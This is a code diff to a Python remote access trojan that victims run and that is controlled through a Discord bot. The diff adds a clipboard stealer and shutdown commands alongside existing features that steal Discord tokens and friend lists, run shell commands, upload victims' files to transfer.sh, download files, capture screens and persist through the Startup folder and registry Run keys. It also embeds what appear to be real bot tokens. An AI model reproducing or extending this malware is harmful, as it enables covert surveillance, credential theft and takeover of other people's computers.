@@ -5,6 +5,7 @@ import os
 import os.path
 import time
 import urllib.request
+import winreg
 from base64 import b64decode
 from json import loads
 from os.path import join, exists
@@ -12,9 +13,9 @@ from re import findall
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 
+
 import discord
 import pyautogui
-import winreg
 import requests
 from discord import *
 from discord.utils import get
@@ -22,16 +23,19 @@ from discord.utils import get
 global ping_on_startup
 global token
 global guild_iD
-guild_iD = "984582818489331732"
+guild_iD = "1036648125307297812"
 # guild id here
-token = "MTAxNDcwNzQ3Njg5NTExNzM3NA.GpUPeK.1GLWJj74sgmkIlJ0dT_ysQRMRFp4Fuvxa4CxuI"
+token = "MTAxNDcwNzQ3Njg5NTExNzM3NA.GPTdzm.VqhLPWhkguJPTzWQEYKFq-MZk2yTD7I2IdMOZo"
 # Bot Token Here Obviously
+
 # Bot needs all intents
 ping_on_startup = True
+ChannelName = "general"
+# name of the channel you want to send the ping_on_startup message to
 # if the bot should ping you when an infected user starts the File
 
 """
-path = f"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows.pyw" % getenv("userprofile")
+path = f"%s/Microsoft/Windows/Start Menu/Programs/Startup/Windows.pyw" % getenv("appdata")
 if not exists(path):
 	copy(__file__, path)
 	startfile(path)
@@ -54,14 +58,14 @@ bot = Control()
 @bot.event
 async def on_ready():
 	# print(f"logged in as [{bot.user}]")
-	username = os.getenv("username")
-	for guild in bot.guilds:
-		channel = get(guild.text_channels, name="d")
-		if ping_on_startup:
-			try:
+	try:
+		username = os.getenv("username")
+		for guild in bot.guilds:
+			channel = get(guild.text_channels, name=ChannelName)
+			if ping_on_startup:
 				await channel.send(f"@everyone `{username}` started Control")
-			except:
-				pass
+	except:
+		pass
 
 
 def filedownload(url: str, directory: str, filename: str):
@@ -131,31 +135,56 @@ def victimtype(toPress: str):
 def getTasklist():
 	temp = (os.getenv('TEMP'))
 	t = os.popen("tasklist").read()
-	with open(f"temp\\tasklist.txt", "w") as f:
+	with open(f"{temp}\\tasklist.txt", "w") as f:
 		f.write(t)
 	f.close()
 	return f"{temp}\\tasklist.txt"
+
+def getClipBoard():
+	"""
+	temp = (os.getenv('TEMP'))
+	clip = pyperclip.paste()
+	return clip
+	"""
+	CF_TEXT = 1
+
+	kernel32 = ctypes.windll.kernel32
+	kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
+	kernel32.GlobalLock.restype = ctypes.c_void_p
+	kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
+	user32 = ctypes.windll.user32
+	user32.GetClipboardData.restype = ctypes.c_void_p
+
+	user32.OpenClipboard(0)
+	try:
+		if user32.IsClipboardFormatAvailable(CF_TEXT):
+			data = user32.GetClipboardData(CF_TEXT)
+			data_locked = kernel32.GlobalLock(data)
+			text = ctypes.c_char_p(data_locked)
+			value = text.value.decode('utf-8')
+			kernel32.GlobalUnlock(data_locked)
+			return value
+
+	except:
+		return "Error"
+	finally:
+		user32.CloseClipboard()
 
 
 def systemInfo():
 	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
 	hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 	output = ""
-	ip = get('https://api.ipify.org')
+	ip = requests.get('https://api.ipify.org').text
 	envsToGet = ["LANG", "COMPUTERNAME", "COMMONPROGRAMFILES", "LOCALAPPDATA", "OS", "PROCESSOR_ARCHITECTURE",
-				 "SYSTEMROOT", "TEMP", "USERDOMAIN", "USERNAME", "USERPROFILE"]
+	             "SYSTEMROOT", "TEMP", "USERDOMAIN", "USERNAME", "USERPROFILE"]
 	for i in envsToGet:
 		output += f"{i} = {os.getenv(i)}\n"
 	import platform
 	info = platform.uname()
-	info_total = f"""
-        System: {info.system}
-	Release: {info.release}
-	Machine: {info.machine}
-	Processor: {info.processor}
-	HWID: {hwid}
-	Ip: {ip}
-	"""
+	info_total = f"System: {info.system}\nRelease: {info.release}\nMachine: {info.machine}\nProcessor: {info.processor}\nHWID: {hwid}\nIp: {ip}"
+
+
 	with open(f"{temp}\\systeminfo.txt", "w") as f:
 		f.write(info_total)
 	f.close()
@@ -168,6 +197,7 @@ def systemInfo():
 
 global temp
 temp = os.getenv('TEMP')
+
 
 
 def searchFile(directory: str, keyword: str):
@@ -256,7 +286,7 @@ def getDiscordData():
 	def getFriends(token):
 		try:
 			return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
-										 headers=getHeader(token))).read().decode())
+			                             headers=getHeader(token))).read().decode())
 		except:
 			pass
 
@@ -305,7 +335,7 @@ def getDiscordData():
 
 
 @bot.tree.command(name="discordinfo",
-				  description="get victim's discord info")
+                  description="get victim's discord info")
 async def discordinfo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting discordInfo...")
 	getDiscordData()
@@ -314,10 +344,16 @@ async def discordinfo(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="crash",
-				  description="crash your victim's computer")
+                  description="crash your victim's computer")
 async def cr(interaction: discord.Interaction):
 	await interaction.response.send_message(f"crashing machine...")
 	await interaction.channel.send(crash())
+
+@bot.tree.command(name="clipboard",
+                  description="get the victim's clipboard")
+async def cr(interaction: discord.Interaction):
+	await interaction.response.send_message(f"getting clipboard...")
+	await interaction.channel.send(f" `{os.getenv('username')}`'s Clipboard: ```{getClipBoard()}```")
 
 
 @bot.tree.command(name="cmd", description="execute command in cmd")
@@ -342,29 +378,56 @@ async def listdir(interaction: discord.Interaction, directory: str):
 	await interaction.channel.send(f"{ListDir(directory)}")
 
 
-@bot.tree.command(name="write", description="make your victim write something")
+@bot.tree.command(name="type", description="make your victim type something")
 async def typing(interaction: discord.Interaction, message: str):
 	await interaction.response.send_message(f"typing `{message}`...")
-	await interaction.channel.send(victimtype(message))
+	try:
+		await interaction.channel.send(victimtype(message))
+	except Exception as err:
+		await interaction.channel.send("Error while typing: "+err)
 
 
 @bot.tree.command(name="tasklist",
-				  description="list all running processes")
+                  description="list all running processes")
 async def tasklist(interaction: discord.Interaction):
 	await interaction.response.send_message(f"listing all tasks...")
 	await interaction.channel.send(file=discord.File(getTasklist()))
 	os.remove(getTasklist())
 
 
+@bot.tree.command(name="shutdown",
+                  description="shutdown your victim's computer with a timer (seconds)")
+async def geo(interaction: discord.Interaction, timer: int):
+	await interaction.response.send_message(f"shutting down in {timer} seconds...")
+	x = os.system("shutdown /s /t " + str(timer))
+	await interaction.channel.send(f"Code: {x}")
+
+
+@bot.tree.command(name="cancel_shutdown",
+                  description="shutdown your victim's computer with a timer")
+async def geo(interaction: discord.Interaction):
+	await interaction.response.send_message(f"cancelling shutdown...")
+	x = os.system("shutdown /a")
+	await interaction.channel.send(f"Code: `{x}`")
+
+
+@bot.tree.command(name="shutdown_with_message",
+                  description="shutdown your victim's computer with a Message and timer")
+async def geo(interaction: discord.Interaction, message: str, timer: int):
+	await interaction.response.send_message(f"shutting down with message: `{message}` in {str(timer)} seconds...")
+	x = os.system(f'shutdown /r /t {str(timer)} /c "{str(message)}"')
+	await interaction.channel.send(f"Code: `{x}`")
+
+
 @bot.tree.command(name="geolocate",
-				  description="get the geolocation of the of the machine with google maps (not very precise)")
+                  description="get the geolocation of the of the machine with google maps (not very precise)")
 async def geo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting geolocation by ip...")
 	await interaction.channel.send(geolocate())
 
 
 @bot.tree.command(name="systeminfo",
-				  description="attempt to get system info")
+                  description="attempt to get system info")
 async def sysinfo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting system info...")
 	systempath, envpath = systemInfo()
@@ -383,14 +446,14 @@ async def scr(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="upload",
-				  description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
+                  description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
 async def upload(interaction: discord.Interaction, location: str):
 	await interaction.response.send_message(f"searching for `{location}`...")
 	await interaction.channel.send(transfer(location))
 
 
 @bot.tree.command(name="search",
-				  description="search for a file on the victim's pc pc (use %user% instead of username)")
+                  description="search for a file on the victim's pc pc (use %user% instead of username)")
 async def search(interaction: discord.Interaction, location: str, keyword: str):
 	await interaction.response.send_message(f"searching for keyword `{keyword}` in `{location}`...")
 	await interaction.channel.send(searchFile(location, keyword))
@@ -403,7 +466,7 @@ async def deleteFile(interaction: discord.Interaction, locinput: str):
 
 
 @bot.tree.command(name="download",
-				  description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
+                  description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
 async def downloadFile(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
 	await interaction.response.send_message(f"searching for `{targeturl}`...")
 	await interaction.channel.send(filedownload(targeturl, directory, filename))
@@ -415,13 +478,20 @@ async def logo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"Successfully logged out")
 
 
+@bot.tree.command(name="no_antivirus",
+                  description="Display the blue guy meme just with the text 'no antivirus'")
+async def cr(interaction: discord.Interaction):
+	os.system("start https://ibb.co/XXswB44")
+	await interaction.response.send_message(f"displaying https://ibb.co/XXswB44")
+
+
 @bot.tree.command(name="autostart_reg_root", description="add the program to the autostart")
 async def asr(interaction: discord.Interaction, value_name: str):
 	try:
 		with winreg.CreateKeyEx(winreg.HKEY_CLASSES_ROOT, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
-								winreg.KEY_WRITE) as key:
+		                        winreg.KEY_WRITE) as key:
 			winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ,
-							  f"SecurityHealthSystray.exe --on-boot --auto-start --silent --no-console --preload --first-check & python {os.path.abspath(__file__)}")
+			                  f"python {os.path.abspath(__file__)}")
 		await interaction.response.send_message(f"Successfully added registry entry")
 	except Exception as err:
 		await interaction.response.send_message(f"Failed to add registry entry: \n -> ```{err}```")
@@ -431,9 +501,9 @@ async def asr(interaction: discord.Interaction, value_name: str):
 async def asu(interaction: discord.Interaction, value_name: str):
 	try:
 		with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
-								winreg.KEY_WRITE) as key:
+		                        winreg.KEY_WRITE) as key:
 			winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ,
-							  f"SecurityHealthSystray.exe --on-boot --auto-start --silent --no-console --preload --first-check & python {os.path.abspath(__file__)}")
+			                  f"python {os.path.abspath(__file__)}")
 		await interaction.response.send_message(f"Successfully added registry entry")
 	except Exception as err:
 		await interaction.response.send_message(f"Failed to add registry entry: \n -> ```{err}```")
